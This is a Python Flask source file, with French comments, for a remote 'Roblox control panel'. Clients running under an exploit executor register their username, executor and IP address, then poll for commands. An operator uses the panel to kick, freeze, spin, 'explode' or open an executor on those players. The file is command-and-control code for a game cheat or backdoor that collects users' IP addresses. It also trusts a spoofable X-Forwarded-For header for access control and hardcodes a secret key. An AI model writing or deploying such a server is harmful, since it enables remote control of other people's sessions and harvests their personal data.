from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "change_me_to_something_very_long_and_random_123456789"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# === CHANGE CES IPs AVEC LES TIENNES ===
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    return f"""
    <html><body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ton IP : <b>{ip}</b></p>
    </body></html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;color:white;transition:transform .2s;margin-bottom:8px}
button.kick-btn:hover{transform:scale(1.05)}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
.modal-content input{width:100%;padding:15px;background:#222;color:white;border-radius:12px;margin:20px 0}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
.cancel-btn{background:#444;color:white}
.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6);animation:slide 0.5s}
.toast.danger{border-color:#ff3366}
@keyframes slide{from{transform:translateX(100%)}to{transform:translateX(0)}}
</style>
</head>
<body>
<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="stats" id="stats">Players online: <b>0</b></div>
    <div class="grid" id="players"></div>
</div>

<!-- Modal Kick -->
<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Raison (optionnel)" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" onclick="document.getElementById('kickModal').classList.remove('active')">Annuler</button>
            <button class="confirm-btn" onclick="performKick()">Confirmer</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let targetUserId = null;

function toast(msg, type="success") {
    const t = document.createElement("div");
    t.className = "toast " + (type==="danger"?"danger":"");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) {
    targetUserId = id;
    document.getElementById("kickModal").classList.add("active");
    document.getElementById("kickReason").focus();
}

function performKick() {
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: targetUserId, reason: reason})});
    toast("Kick envoyé", "danger");
    document.getElementById("kickModal").classList.remove("active");
}

function sendTroll(id, cmd) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
    toast(cmd.toUpperCase() + " envoyé", "danger");
}

socket.on("update", data => {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const current = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById("card_"+id);
        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = "card_"+id; grid.appendChild(card); }

        card.innerHTML = `
            <div class="status"><div class="dot ${p.online?"online":""}"></div><span>${p.online?"Online":"Offline"}</span></div>
            <div class="name"><a href="https://roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}</div>
            
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
            </div>

            <div class="category">EXECUTOR</div>
            <div style="display:grid;grid-template-columns:1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ff00,#00aa00);font-size:1.3rem;padding:20px;" onclick="sendTroll('${id}','open_executor')">
                    OUVRIR EXECUTOR (Insert)
                </button>
            </div>

            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
            </div>
        `;
    });

    document.querySelectorAll('.card').forEach(c => {
        if (!current.has(c.id.replace('card_',''))) c.remove();
    });
});
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d.get("userid", ""))
            action = d.get("action")
            if action == "register" and uid:
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True
                }
                socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
            elif action == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    elif request.method == "GET":
        uid = request.args.get("userid", "")
        if uid and uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify(cmd)
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "Kicked by admin")
    if uid:
        pending_commands[uid] = {"command": "kick", "reason": reason}
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = {"command": cmd}
        username = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": username, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in list(connected_players.items()):
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            socketio.emit("status", {"username": username, "online": False})
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
